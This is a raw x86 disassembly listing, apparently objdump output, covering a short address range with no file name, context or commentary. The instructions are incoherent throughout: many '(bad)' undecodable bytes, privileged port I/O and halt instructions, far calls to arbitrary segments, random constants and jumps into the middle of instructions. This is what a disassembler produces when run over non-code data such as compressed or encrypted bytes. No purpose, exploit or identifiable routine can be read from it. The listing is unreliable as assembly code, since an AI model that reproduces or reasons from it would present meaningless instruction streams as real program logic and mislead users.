  40b82d:	(bad)
  40b830:	xor    al,0xf0
  40b832:	std    
  40b833:	inc    ebp
  40b834:	jo     0x40b7c1
  40b836:	test   eax,0xc611c67e
  40b83b:	xor    al,0x19
  40b83d:	xchg   ecx,eax
  40b83e:	mov    ?,ecx
  40b840:	in     eax,dx
  40b841:	imul   esp,DWORD PTR ds:0xa4396b7a,0x6d05db6f
  40b84b:	push   eax
  40b84c:	cld    
  40b84d:	pop    ebp
  40b84e:	aam    0x51
  40b850:	lds    esp,FWORD PTR [eax+ecx*1+0x4a]
  40b854:	or     ch,BYTE PTR [edi]
  40b856:	stc    
  40b857:	stc    
  40b858:	ret    
  40b859:	mov    ecx,DWORD PTR [edx+0x528c0830]
  40b85f:	push   0xf1f5a09d
  40b864:	mov    es,WORD PTR [ebx]
  40b866:	or     esp,DWORD PTR [edi+0x30]
  40b869:	lock mov eax,DWORD PTR ds:0xb53123c7
  40b870:	and    al,0x3
  40b872:	mov    edx,0x2d9db94e
  40b877:	cwde   
  40b878:	in     al,dx
  40b879:	xor    eax,0xbdaa44b9
  40b87e:	sbb    ch,BYTE PTR [ebx]
  40b880:	fcomp  DWORD PTR [eax+ecx*8-0x15]
  40b884:	loop   0x40b8ca
  40b886:	call   FWORD PTR [ebx-0xe]
  40b889:	mov    esp,0xc033aa91
  40b88e:	mov    DWORD PTR [ebp+eiz*2+0x55],ebx
  40b892:	out    0xe8,eax
  40b894:	lock push es
  40b896:	out    0xb4,eax
  40b898:	int    0xc8
  40b89a:	and    BYTE PTR [edx-0x48],bh
  40b89d:	jae    0x40b8f7
  40b89f:	push   ds
  40b8a0:	cwde   
  40b8a1:	int3   
  40b8a2:	not    DWORD PTR [ecx]
  40b8a4:	sar    BYTE PTR ds:0x1192c483,1
  40b8aa:	pop    ss
  40b8ab:	repz hlt 
  40b8ad:	dec    edx
  40b8ae:	pop    ebx
  40b8af:	adc    eax,0xcf9ac459
  40b8b4:	push   edx
  40b8b5:	gs pusha 
  40b8b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8b8:	daa    
  40b8b9:	xor    eax,edi
  40b8bb:	das    
  40b8bc:	lahf   
  40b8bd:	or     BYTE PTR [ebp-0x5b],ch
  40b8c0:	adc    edx,DWORD PTR [esi]
  40b8c2:	or     ch,dl
  40b8c4:	push   esp
  40b8c5:	ins    DWORD PTR es:[edi],dx
  40b8c6:	dec    ebp
  40b8c7:	out    dx,eax
  40b8c8:	addr16 inc ebx
  40b8ca:	es dec bx
  40b8cd:	cmp    BYTE PTR [ebx+0xf9554a7],dl
  40b8d3:	out    0x32,eax
  40b8d5:	mov    al,ds:0x12b35bd5
  40b8da:	xchg   ebx,eax
  40b8db:	xchg   esp,eax
  40b8dc:	(bad)  
  40b8dd:	jns    0x40b948
  40b8df:	lock pusha 
  40b8e1:	dec    bx
  40b8e3:	fdivp  st(2),st
  40b8e5:	aam    0xfb
  40b8e7:	cli    
  40b8e8:	inc    ebx
  40b8e9:	add    eax,0x67093c01
  40b8ee:	lea    ecx,[ebx]
  40b8f0:	in     eax,dx
  40b8f1:	and    cl,BYTE PTR [ecx]
  40b8f3:	add    bh,bl
  40b8f5:	comiss xmm1,DWORD PTR [edx+0x4b]
  40b8f9:	mov    bh,BYTE PTR [ecx+0x0]
  40b8fc:	outs   dx,BYTE PTR ds:[esi]
  40b8fd:	ins    BYTE PTR es:[edi],dx
  40b8fe:	mov    edi,DWORD PTR [esi+0x7ef5c956]
  40b904:	sbb    DWORD PTR [eax+0x39],0x7e
  40b908:	push   0xffffff80
  40b90a:	out    dx,al
  40b90b:	dec    ebx
  40b90c:	dec    eax
  40b90d:	(bad)  
  40b90f:	fmul   DWORD PTR [edi]
  40b911:	lods   al,BYTE PTR ds:[esi]
  40b912:	in     al,0x47
  40b914:	fs push 0xffffffc7
  40b917:	fbld   TBYTE PTR [edx]
  40b919:	sbb    BYTE PTR [esi+ebp*1+0x6c],ah
  40b91d:	jp     0x40b956
  40b91f:	mov    cl,0x31
  40b921:	or     al,0x8e
  40b923:	(bad)  
  40b924:	lods   eax,DWORD PTR ds:[esi]
  40b925:	mov    cl,cl
  40b927:	sub    DWORD PTR [edx-0x37b4c70a],eax
  40b92d:	or     BYTE PTR [eax+0x218ff6a1],bh
  40b933:	mov    ebp,0x3faddf23
  40b938:	jno    0x40b9af
  40b93a:	push   cs
  40b93b:	ficomp DWORD PTR [esi-0x42]
  40b93e:	inc    BYTE PTR [esi]
  40b940:	fsubr  QWORD PTR [eax]
  40b942:	and    al,0x44
  40b944:	adc    eax,0xbc75b137
  40b949:	mov    ah,0x9a
  40b94b:	xchg   ebx,eax
  40b94c:	pop    eax
  40b94d:	mov    bh,0x7c
  40b94f:	outs   dx,BYTE PTR ds:[esi]
  40b950:	test   BYTE PTR [edi],cl
  40b952:	cli    
  40b953:	adc    BYTE PTR [edi],ah
  40b955:	push   0x1a
  40b957:	inc    esi
  40b958:	out    dx,eax
  40b959:	jmp    0x53c4:0x9f6e4398
  40b960:	ror    eax,1
  40b962:	jne    0x40b94b
  40b964:	test   DWORD PTR [ebp+0x2d09c5fa],edx
  40b96a:	or     al,0xa5
  40b96c:	jb     0x40b8f6
  40b96e:	mov    cl,0x11
  40b970:	mov    esi,0x75218172
  40b975:	jo     0x40b9cb
  40b977:	xor    ecx,eax
  40b979:	push   ss
  40b97a:	sbb    bh,BYTE PTR [ecx-0x550142f0]
  40b980:	push   ecx
  40b981:	push   es
  40b982:	jl     0x40b9b5
  40b984:	sub    al,0x1
  40b986:	mov    edi,0xe75b420a
  40b98b:	call   0xe7fe:0x991d9e1b
  40b992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b993:	sbb    edx,0xd3ff7a52
  40b999:	cmp    ecx,DWORD PTR [eax+0x96c8ac2]
  40b99f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a0:	mov    edi,0x56f3b486
  40b9a5:	xor    ch,BYTE PTR [ebp+esi*2-0xe]
  40b9a9:	mov    es,ebx
  40b9ab:	add    eax,0x410fd18a
  40b9b0:	test   BYTE PTR [esi],ch
  40b9b2:	xlat   BYTE PTR ds:[ebx]
  40b9b3:	push   edi
  40b9b4:	push   ecx
  40b9b5:	mov    edi,0xf942060
  40b9ba:	ja     0x40b98a
  40b9bc:	pop    ebp
  40b9bd:	cmc    
  40b9be:	xchg   edi,eax
  40b9bf:	jbe    0x40b94f
  40b9c1:	scas   al,BYTE PTR es:[edi]
  40b9c2:	mov    ss,WORD PTR [ecx]
  40b9c4:	leave  
  40b9c5:	mul    dh
  40b9c7:	inc    ebp
  40b9c8:	aam    0x63
  40b9ca:	xchg   DWORD PTR [eax],eax
  40b9cc:	sbb    DWORD PTR [edi],esi
  40b9ce:	out    0xdf,al
  40b9d0:	dec    ecx
  40b9d1:	xchg   esi,eax
  40b9d2:	pop    esp
  40b9d3:	(bad)  
  40b9d5:	pop    esi
  40b9d6:	fwait
  40b9d7:	lock jge 0x40ba23
  40b9da:	lea    ecx,[eax-0x7d]
  40b9dd:	outs   dx,BYTE PTR ds:[esi]
  40b9de:	out    0xab,eax
  40b9e0:	rcr    DWORD PTR [eax],1
  40b9e2:	stos   BYTE PTR es:[edi],al
  40b9e3:	cli    
  40b9e4:	mov    ebp,0xae52da05
  40b9e9:	jnp    0x40ba2b
  40b9eb:	jo     0x40b9b3
  40b9ed:	shr    BYTE PTR [esi+0x6a],1
  40b9f0:	and    DWORD PTR [esp+ecx*4-0x66],edi
  40b9f4:	(bad)  
  40b9f5:	adc    DWORD PTR [eax],esp
  40b9f7:	inc    eax
  40b9f8:	dec    edi
  40b9f9:	scas   al,BYTE PTR es:[edi]
  40b9fa:	xor    esi,DWORD PTR [eax]
  40b9fc:	(bad)  
  40b9fd:	push   edx
  40b9fe:	sub    al,BYTE PTR [esp+ecx*2+0x244fd34d]
  40ba05:	ja     0x40b9db
  40ba07:	popf   
  40ba08:	or     DWORD PTR [edx+0x52],edx
  40ba0b:	pop    ebp
  40ba0c:	hlt    
  40ba0d:	popa   
  40ba0e:	inc    ebx
  40ba0f:	(bad)  
  40ba10:	lods   al,BYTE PTR ds:[esi]
  40ba11:	mov    esi,0x102dedf4
  40ba16:	test   DWORD PTR [esi+0x5c],esp
  40ba19:	add    BYTE PTR [ebp+0x25a02efa],0x97
  40ba20:	jo     0x40ba5a
  40ba22:	cmp    DWORD PTR [esi-0x774a120a],ecx
  40ba28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba29:	add    ebx,0xc71d3a0f
  40ba2f:	add    DWORD PTR [ecx-0x5c],esi
  40ba32:	xchg   ecx,eax
  40ba33:	cmp    dh,BYTE PTR [eax]
  40ba35:	jbe    0x40b9c2
  40ba37:	nop
  40ba38:	(bad)  
  40ba3a:	pop    eax
  40ba3b:	bound  edi,QWORD PTR [esi+0x66]
  40ba3e:	out    dx,eax
  40ba3f:	mov    dh,0x62
  40ba41:	dec    esi
  40ba42:	jmp    0x14dce88d
  40ba47:	sbb    eax,0xfb58e3d5
  40ba4c:	fdivp  st(3),st
  40ba4e:	ret    0x1dc9
  40ba51:	push   cs
  40ba52:	ret    
  40ba53:	test   eax,0x86b5cdda
  40ba58:	popf   
  40ba59:	repz inc ebp
  40ba5b:	shr    DWORD PTR [edi+edi*1-0xa],cl
  40ba5f:	test   eax,0xa214d295
  40ba64:	jno    0x40bae2
  40ba66:	adc    esi,DWORD PTR [ecx-0x79bc2e21]
  40ba6c:	cmp    ecx,DWORD PTR [edi-0x10c841c7]
  40ba72:	pop    ss
  40ba73:	enter  0x2b64,0x49
  40ba77:	push   eax
  40ba78:	adc    BYTE PTR [esi],ah
  40ba7a:	(bad)  
  40ba7b:	stos   BYTE PTR es:[edi],al
  40ba7c:	dec    cx
  40ba7e:	test   al,dh
  40ba80:	loopne 0x40ba25
  40ba82:	xchg   edx,eax
  40ba83:	fcmovbe st,st(7)
  40ba85:	repnz inc edi
  40ba87:	mov    esi,0x119fe5e6
  40ba8c:	xor    BYTE PTR [eax],0x2f
  40ba8f:	mov    bl,0x42
  40ba91:	push   eax
  40ba92:	push   0xffffff89
  40ba94:	lea    ebp,[edx]
  40ba96:	inc    esp
  40ba97:	and    edi,eax
  40ba99:	imul   eax,DWORD PTR [eax-0x21],0xfffffffb
  40ba9d:	test   ecx,esp
  40ba9f:	aad    0x3
  40baa1:	in     eax,dx
  40baa2:	fstp   DWORD PTR [edx+eiz*1+0x52]
  40baa6:	cmp    BYTE PTR [esi+ebp*1],bl
  40baa9:	(bad)  
  40baab:	inc    ebp
  40baac:	push   ebp
  40baad:	or     eax,0xee4377b5
  40bab2:	sub    eax,DWORD PTR [edi+0x46]
  40bab5:	jne    0x40bad3
  40bab7:	xor    al,0x4b
  40bab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baba:	sbb    bl,BYTE PTR [ebx]
  40babc:	(bad)  
  40babd:	mov    edx,0xb46d8a99
  40bac2:	sub    bh,bl
  40bac4:	mov    dl,0x69
  40bac6:	jl     0x40bb39
  40bac8:	ins    DWORD PTR es:[edi],dx
  40bac9:	leave  
  40baca:	out    dx,eax
  40bacb:	and    BYTE PTR [esi-0x54a820ee],0x8e
  40bad2:	(bad)  
  40bad3:	dec    esi
  40bad4:	in     al,dx
  40bad5:	repz xor DWORD PTR [ebx+0x70bfd418],esp
  40badc:	mov    bh,0x5b
  40bade:	jg     0x40ba9c
  40bae0:	les    ecx,FWORD PTR [edi-0x3a]
  40bae3:	bound  esp,QWORD PTR ds:0xbebdc7ba
  40bae9:	js     0x40ba8a
  40baeb:	(bad)  
  40baed:	pushf  
  40baee:	test   al,0x98
  40baf0:	mov    BYTE PTR [esi+0x6e],cl
  40baf3:	cmp    bh,dl
  40baf5:	pushf  
  40baf6:	imul   edx,DWORD PTR cs:[edi+0x6e],0xffffffde
  40bafb:	cs xor ecx,ecx
  40bafe:	ds pop edx
  40bb00:	fwait
  40bb01:	sub    DWORD PTR [eax-0xe],edi
  40bb04:	sbb    eax,0xba8c6fa8
  40bb09:	ret    0x67a9
  40bb0c:	fldcw  WORD PTR [esi+0x67757c8f]
  40bb12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb13:	sar    DWORD PTR [ebp+0x6b],0xf4
  40bb17:	inc    DWORD PTR [edx+0x36954ece]
  40bb1d:	in     al,0x13
  40bb1f:	dec    esp
  40bb20:	fwait
  40bb21:	rcl    cl,cl
  40bb23:	pop    esp
  40bb24:	xchg   esi,eax
  40bb25:	mov    ebp,DWORD PTR [ebp+0x55ca9774]
  40bb2b:	call   0xf4cd:0xbba91d86
  40bb32:	pop    ebx
  40bb33:	outs   dx,DWORD PTR ds:[esi]
  40bb34:	dec    eax
  40bb35:	jbe    0x40bb19
  40bb37:	or     dl,BYTE PTR [edx-0x6d6a3ea]
  40bb3d:	les    ebx,FWORD PTR [ecx]
  40bb3f:	popf   
  40bb40:	inc    eax
  40bb41:	jmp    0x40bbad
  40bb43:	pop    eax
  40bb44:	add    esp,DWORD PTR [edx-0x3]
  40bb47:	mov    eax,0xeb1b371f
  40bb4c:	aas    
  40bb4d:	mov    ds:0xdeb0f20d,al
  40bb52:	xor    DWORD PTR [esi],ebx
  40bb54:	mov    ds:0xa82057a0,eax
  40bb59:	push   es
  40bb5a:	lds    esp,FWORD PTR [esi+ebp*2+0x4d]
  40bb5e:	mul    DWORD PTR [edx-0x1153f3c1]
  40bb64:	(bad)  
  40bb65:	xchg   DWORD PTR ds:0x6c3ac786,ebp
  40bb6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb6d:	not    esi
  40bb6f:	jns    0x40bb35
  40bb71:	vmaxss xmm7,xmm6,DWORD PTR [esi-0x125af69e]
  40bb79:	or     edx,DWORD PTR [eax-0x1d]
  40bb7c:	push   ss
  40bb7d:	fimul  WORD PTR [edx]
  40bb7f:	adc    edi,DWORD PTR [eax]
  40bb81:	pop    ecx
  40bb82:	adc    al,0x98
  40bb84:	and    eax,0x2363673
  40bb89:	mov    bh,0x9a
  40bb8b:	icebp  
  40bb8c:	add    eax,0x91101199
  40bb91:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40bb93:	pop    es
  40bb94:	sti    
  40bb95:	test   DWORD PTR [eax+0x31ffd910],edx
  40bb9b:	xor    DWORD PTR [ebp-0x436fb6a4],ebp
  40bba1:	jb     0x40bb5f
  40bba3:	add    ebx,edx
  40bba5:	mov    esi,0xbb59e7ea
  40bbaa:	cmp    al,0xb3
  40bbac:	xor    ecx,DWORD PTR [ecx+edx*4]
  40bbaf:	push   edx
  40bbb0:	sub    al,0xd
  40bbb2:	jmp    0x40bbf4
  40bbb4:	ins    DWORD PTR es:[edi],dx
  40bbb5:	mov    dh,0xb
  40bbb7:	pop    esp
  40bbb8:	shl    DWORD PTR [eax],1
  40bbba:	inc    edi
  40bbbb:	mov    esp,0x59e17c48
  40bbc0:	icebp  
  40bbc1:	push   edi
  40bbc2:	nop
  40bbc3:	and    ch,BYTE PTR [edx+0x2fe22411]
  40bbc9:	test   edx,edx
  40bbcb:	add    ebp,edx
  40bbcd:	int    0x28
  40bbcf:	das    
  40bbd0:	xor    DWORD PTR [ebx+edx*4+0x74],ecx
  40bbd4:	es mov bh,0x12
  40bbd7:	pop    edi
  40bbd8:	or     BYTE PTR [edi+0x2c],dh
  40bbdb:	les    edx,FWORD PTR [ebp+0xbb5c971]
  40bbe1:	mov    eax,DWORD PTR [esi+0x34]
  40bbe4:	gs cmp eax,0xa1a06cb4
  40bbea:	lock sub esi,eax
  40bbed:	mov    dl,0x8e
  40bbef:	xchg   ebx,eax
  40bbf0:	es pushf 
  40bbf2:	xchg   dh,al
  40bbf4:	xchg   esp,eax
  40bbf5:	add    eax,0x51c44c27
  40bbfa:	fsub   DWORD PTR [ecx]
  40bbfc:	pusha  
  40bbfd:	data16 jl 0x40bc6d
  40bc00:	cwde   
  40bc01:	sbb    dl,al
  40bc03:	cmp    eax,0x9b7cbca5
  40bc08:	sub    eax,DWORD PTR [ebx+0x1b5786e4]
  40bc0e:	icebp  
  40bc0f:	jmp    0x48dfd777
  40bc14:	jbe    0x40bc23
  40bc16:	xlat   BYTE PTR ds:[ebx]
  40bc17:	inc    ebx
  40bc18:	fisubr DWORD PTR [esp+ebp*1+0x2dd5bb74]
  40bc1f:	and    bl,dh
  40bc21:	push   0x5d
  40bc23:	iret   
  40bc24:	dec    ecx
  40bc25:	or     DWORD PTR [edi+0x537cd033],0x66
  40bc2c:	pushf  
  40bc2d:	pop    edx
  40bc2e:	pop    edi
  40bc2f:	push   esi
  40bc30:	dec    esi
  40bc31:	jno    0x40bc48
  40bc33:	add    BYTE PTR [ebp+ebx*4-0x1b],al
  40bc37:	push   cs
  40bc38:	mov    esp,0xe2d9c228
  40bc3d:	xchg   edi,eax
  40bc3e:	xchg   esp,eax
  40bc3f:	mov    edi,DWORD PTR [edx]
  40bc41:	push   es
  40bc42:	xchg   ecx,eax
  40bc43:	mov    eax,ds:0x19f6741a
  40bc48:	fdiv   st,st(7)
  40bc4a:	sbb    cl,BYTE PTR [ebx-0x27092b62]
  40bc50:	call   0x39c4d533
  40bc55:	sar    BYTE PTR [esi+esi*8],0x25
  40bc59:	repz dec ebx
  40bc5b:	dec    ebx
  40bc5c:	sti    
  40bc5d:	ds dec ecx
  40bc5f:	pop    esi
  40bc60:	jl     0x40bbe5
  40bc62:	sbb    al,0xe1
  40bc64:	out    dx,al
  40bc65:	xchg   edi,eax
  40bc66:	pushf  
  40bc67:	fs call 0x3776ebde
  40bc6d:	fwait
  40bc6e:	dec    esi
  40bc6f:	inc    edx
  40bc70:	(bad)  
  40bc71:	dec    eax
  40bc72:	add    eax,0x8f07dabe
  40bc77:	inc    esi
  40bc78:	mov    cl,0x61
  40bc7a:	std    
  40bc7b:	add    al,0xf6
  40bc7d:	xchg   ecx,eax
  40bc7e:	mov    esp,0xd079c7ff
  40bc83:	clc    
  40bc84:	fs jmp 0x40bc70
  40bc87:	in     al,0x7a
  40bc89:	dec    ecx
  40bc8a:	push   0x1cb6587
  40bc8f:	adc    ah,ah
  40bc91:	xchg   DWORD PTR [ecx-0x1d5d38fd],ecx
  40bc97:	mov    al,0x91
  40bc99:	fcom   DWORD PTR [edi-0x19]
  40bc9c:	mov    BYTE PTR [esp+ecx*2-0x5c8bb3d4],dh
  40bca3:	adc    eax,0x1d6c2a82
  40bca8:	in     eax,0x37
  40bcaa:	cwde   
  40bcab:	stos   BYTE PTR es:[edi],al
  40bcac:	int3   
  40bcad:	inc    ecx
  40bcae:	mov    edx,DWORD PTR [ebx+eax*8]
  40bcb1:	loop   0x40bd07
  40bcb3:	(bad)  
  40bcb4:	into   
  40bcb5:	xchg   ecx,eax
  40bcb6:	ins    DWORD PTR es:[edi],dx
  40bcb7:	ret    
  40bcb8:	or     eax,0x58c63a47
  40bcbd:	pop    eax
  40bcbe:	aam    0x4d
  40bcc0:	aam    0x65
  40bcc2:	mov    WORD PTR [edx+esi*4+0x20],es
  40bcc6:	fdivr  DWORD PTR [edx+0x61217ba6]
  40bccc:	popf   
  40bccd:	cmp    cl,BYTE PTR [edx+0x45b0b99d]
  40bcd3:	fstp   TBYTE PTR ds:0x19635f54
  40bcd9:	or     BYTE PTR [ecx-0x58],ch
  40bcdc:	iret   
  40bcdd:	pop    eax
  40bcde:	adc    ebx,DWORD PTR [edi-0x4c0b83e2]
  40bce4:	dec    esp
  40bce5:	pop    edi
  40bce6:	mov    bh,BYTE PTR [edx+0x36]
  40bce9:	pop    eax
  40bcea:	inc    edx
  40bceb:	mov    bh,0xb5
  40bced:	mov    esp,0x58a89611
  40bcf2:	inc    esi
  40bcf3:	ror    DWORD PTR [ebp+0x5e],cl
  40bcf6:	mov    cl,0xcf
  40bcf8:	jg     0x40bcd3
  40bcfa:	or     ebx,ecx
  40bcfc:	test   eax,0x41905003
  40bd01:	stos   DWORD PTR es:[edi],eax
  40bd02:	push   ebp
  40bd03:	and    dl,BYTE PTR [ebp+0x312db15f]
  40bd09:	adc    eax,0x9f918d25
  40bd0e:	out    dx,eax
  40bd0f:	mov    cl,0x14
  40bd11:	or     al,0x15
  40bd13:	mov    edx,0xbf2e3658
  40bd18:	imul   edi,DWORD PTR [eax-0x1e],0xffffff86
  40bd1c:	sar    BYTE PTR [edi+0x2a23049a],0xc2
  40bd23:	xor    al,BYTE PTR [esi-0x31]
  40bd26:	mov    esp,0xdf66d5e8
  40bd2b:	scas   al,BYTE PTR es:[edi]
  40bd2c:	lahf   
  40bd2d:	pop    ebx
  40bd2e:	(bad)  
  40bd2f:	cmp    bh,BYTE PTR [edi-0x53]
  40bd32:	and    BYTE PTR [eax-0x70],bl
  40bd35:	sbb    dh,BYTE PTR [edi]
  40bd37:	hlt    
  40bd38:	std    
  40bd39:	in     al,dx
  40bd3a:	mov    esp,0xffdc3e02
  40bd3f:	xchg   edi,eax
  40bd40:	sub    BYTE PTR ds:0x78fd154,dl
  40bd46:	mov    dh,0x4f
  40bd48:	in     eax,dx
  40bd49:	mov    WORD PTR [edx+eax*8-0x5f354454],fs
  40bd50:	push   edi
  40bd51:	test   eax,0xd4b3b55d
  40bd56:	and    eax,0xaab1a5db
  40bd5b:	sub    al,0x1a
  40bd5d:	aad    0x46
  40bd5f:	xchg   dh,bh
  40bd61:	mov    ?,WORD PTR [edi+0x1c]
  40bd64:	xchg   dh,dl
  40bd66:	loope  0x40bd05
  40bd68:	inc    edx
  40bd69:	push   cs
  40bd6a:	and    BYTE PTR fs:[eax-0x78],bl
  40bd6e:	das    
  40bd6f:	outs   dx,BYTE PTR ds:[esi]
  40bd70:	out    dx,al
  40bd71:	loopne 0x40bd7e
  40bd73:	sbb    BYTE PTR [ebx],ch
  40bd75:	inc    eax
  40bd76:	cdq    
  40bd77:	cmp    eax,0xb47a8501
  40bd7c:	jle    0x40bdec
  40bd7e:	sub    DWORD PTR [esi-0x57],eax
  40bd81:	sbb    ecx,edi
  40bd83:	pushf  
  40bd84:	push   ds
  40bd85:	and    al,0xa8
  40bd87:	cmp    BYTE PTR [edi],bh
  40bd89:	retf   
  40bd8a:	cmp    DWORD PTR [esp+ebx*4],esp
  40bd8d:	push   eax
  40bd8e:	test   BYTE PTR [ebp-0x40],0xa9
  40bd92:	push   ecx
  40bd93:	cli    
  40bd94:	mov    ebx,esp
  40bd96:	aaa    
  40bd97:	mov    al,ds:0xca8e8f6a
  40bd9c:	(bad)  
  40bd9d:	js     0x40bdb4
  40bd9f:	jecxz  0x40bd86
  40bda1:	dec    edi
  40bda2:	jae    0x40be01
  40bda4:	or     DWORD PTR [ebx-0x6a],esp
  40bda7:	mul    BYTE PTR [eax-0x2c]
  40bdaa:	inc    edx
  40bdab:	push   ebp
  40bdac:	sbb    eax,0xa6a7ae6c
  40bdb1:	dec    ecx
  40bdb2:	sti    
  40bdb3:	inc    DWORD PTR [edi]
  40bdb5:	push   0xdb62fe31
  40bdba:	cmp    BYTE PTR [ebp+edi*1-0x59],0xa5
  40bdbf:	mov    edx,0x865d80bc
  40bdc4:	jae    0x40bd8b
  40bdc6:	push   ss
  40bdc7:	inc    edx
  40bdc8:	jecxz  0x40bdd0
  40bdca:	adc    BYTE PTR [ebp-0x2a],dl
  40bdcd:	cdq    
  40bdce:	stos   BYTE PTR es:[edi],al
  40bdcf:	xor    ah,BYTE PTR es:[esi]
  40bdd2:	adc    DWORD PTR [eax-0x27],ebp
  40bdd5:	push   cs
  40bdd6:	imul   edx,eax,0x46baaf00
  40bddc:	sbb    al,0x2a
  40bdde:	lds    esp,FWORD PTR [ebx+0x37]
  40bde1:	neg    DWORD PTR [esi]
  40bde3:	mov    DWORD PTR [esi],ebp
  40bde5:	inc    esi
  40bde6:	dec    eax
  40bde7:	mov    esp,0xde73b132
  40bdec:	pop    es
  40bded:	int    0x74
  40bdef:	repnz lahf 
  40bdf1:	mov    bh,0xc1
  40bdf3:	mov    ch,BYTE PTR [eax]
  40bdf5:	inc    ebx
  40bdf6:	push   esp
  40bdf7:	sbb    ebx,DWORD PTR [ecx]
  40bdf9:	xor    BYTE PTR [edi+0x58],ch
  40bdfc:	pusha  
  40bdfd:	and    al,0x8a
  40bdff:	dec    esp
  40be00:	sahf   
  40be01:	add    eax,0x1cc368ef
  40be06:	xor    edx,DWORD PTR [edx+edi*4-0x230b6202]
  40be0d:	mov    edx,esi
  40be0f:	mov    bl,0x9c
  40be11:	out    0x44,al
  40be13:	push   ebp
  40be14:	fs in  al,0x4
  40be17:	data16 xlat BYTE PTR ds:[ebx]
  40be19:	sub    DWORD PTR [edi-0x5d],0xdf5c03c4
  40be20:	xchg   edx,eax
  40be21:	xchg   DWORD PTR [ebx-0x4d4206d1],ebp
  40be27:	jne    0x40be30
  40be29:	ins    BYTE PTR es:[edi],dx
  40be2a:	popf   
  40be2b:	mov    eax,ds:0x998ec619
  40be30:	lds    esi,FWORD PTR [ecx-0x37e5a54f]
  40be36:	xor    ecx,ecx
  40be38:	jp     0x40be47
  40be3a:	lock adc al,0x43
  40be3d:	mov    esp,0x872ac3c9
  40be42:	std    
  40be43:	enter  0xb1d0,0x26
  40be47:	outs   dx,BYTE PTR ds:[esi]
  40be48:	(bad)  
  40be4a:	pop    esi
  40be4b:	stos   DWORD PTR es:[edi],eax
  40be4c:	xor    DWORD PTR [ecx+ebp*2-0x36],0xffffffc8
  40be51:	jl     0x40be64
  40be53:	sub    DWORD PTR [edx],esi
  40be55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be56:	xlat   BYTE PTR ds:[ebx]
  40be57:	lods   al,BYTE PTR ds:[esi]
  40be58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be59:	dec    esi
  40be5a:	and    ah,dl
  40be5c:	mov    WORD PTR [ecx+0x3e],gs
  40be5f:	inc    eax
  40be60:	jno    0x40bec1
  40be62:	cmc    
  40be63:	sbb    bh,BYTE PTR [ecx+ebp*1-0x3c]
  40be67:	xlat   BYTE PTR ds:[ebx]
  40be68:	ins    DWORD PTR es:[edi],dx
  40be69:	or     BYTE PTR [edi-0x9],al
  40be6c:	add    DWORD PTR [eax-0x4b],edx
  40be6f:	pop    ss
  40be70:	in     al,dx
  40be71:	or     ch,dh
  40be73:	repz adc al,0x35
  40be76:	and    eax,0x5362e30f
  40be7b:	dec    eax
  40be7c:	or     al,cl
  40be7e:	jo     0x40be1c
  40be80:	sub    BYTE PTR [ecx+0x7b],bh
  40be83:	call   0x776d:0x7aa7c56c
  40be8a:	int    0x26
  40be8c:	pop    eax
  40be8d:	mov    esp,0x3b3b1c49
  40be92:	shr    BYTE PTR [edx+0x80dec82],cl
  40be98:	dec    edx
  40be99:	clc    
  40be9a:	leave  
  40be9b:	(bad)  
  40be9c:	and    al,0x21
  40be9e:	loope  0x40be67
  40bea0:	test   bh,al
  40bea2:	mov    al,ds:0x229b20a
  40bea7:	dec    edi
  40bea8:	ror    dl,1
  40beaa:	or     esi,DWORD PTR [ebp+0x8]
  40bead:	pop    ebx
  40beae:	fldln2 
  40beb0:	cs and al,0x89
  40beb3:	dec    ebx
  40beb4:	aaa    
  40beb5:	stc    
  40beb6:	fs in  al,dx
  40beb8:	in     al,0xda
  40beba:	adc    eax,0xcd14a360
  40bebf:	dec    ebp
  40bec0:	adc    eax,0x393b0233
  40bec5:	dec    ebx
  40bec6:	cld    
  40bec7:	xor    eax,0x845392ef
  40becc:	mov    eax,0xf92ad598
  40bed1:	mov    al,ds:0x2f0e609f
  40bed6:	pop    ebp
  40bed7:	xor    bl,BYTE PTR [esi-0x3]
  40beda:	dec    esi
  40bedb:	adc    eax,0x379f7fba
  40bee0:	sbb    eax,0x4ef0fba9
  40bee5:	sub    DWORD PTR [eax+eiz*2-0x63],ecx
  40bee9:	add    BYTE PTR [ecx],bh
  40beeb:	add    eax,0x8e1d0899
  40bef0:	stos   BYTE PTR es:[edi],al
  40bef1:	cs jmp 0x40bec9
  40bef4:	gs scas al,BYTE PTR es:[edi]
  40bef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bef7:	and    DWORD PTR [esi],edi
  40bef9:	pop    ds
  40befa:	xor    ch,BYTE PTR [eax-0x43]
  40befd:	inc    ebp
  40befe:	push   eax
  40beff:	leave  
  40bf00:	xchg   edi,eax
  40bf01:	add    dl,BYTE PTR [ecx+0x7d]
  40bf04:	xchg   edx,eax
  40bf05:	add    edi,edi
  40bf07:	ret    
  40bf08:	leave  
  40bf09:	or     DWORD PTR [esi],ebx
  40bf0b:	xchg   BYTE PTR [edx+0x2b],ch
  40bf0e:	mov    edx,0xa8ddeae3
  40bf13:	out    0x51,eax
  40bf15:	stc    
  40bf16:	(bad)  
  40bf17:	pop    esi
  40bf18:	inc    ebp
  40bf19:	aad    0x82
  40bf1b:	(bad)  
  40bf1d:	sti    
  40bf1e:	mov    al,BYTE PTR [ecx+0x2f279562]
  40bf24:	pusha  
  40bf25:	xor    cl,BYTE PTR [eax-0x151e1b02]
  40bf2b:	dec    edi
  40bf2c:	mov    edx,0xa350b700
  40bf31:	adc    esi,DWORD PTR ss:[ecx-0xc]
  40bf35:	mov    dl,0x18
  40bf37:	ret    0xb4cd
  40bf3a:	div    DWORD PTR [ebx+ebx*1-0x2bfc315d]
  40bf41:	repz xor al,0xfc
  40bf44:	dec    esi
  40bf45:	jle    0x40bf30
  40bf47:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40bf49:	push   eax
  40bf4a:	sub    edi,DWORD PTR [eax+0x56b0755a]
  40bf50:	mov    DWORD PTR [ebx+0x61],edi
  40bf53:	push   ss
  40bf54:	test   eax,eax
  40bf56:	pusha  
  40bf57:	jle    0x40bf6a
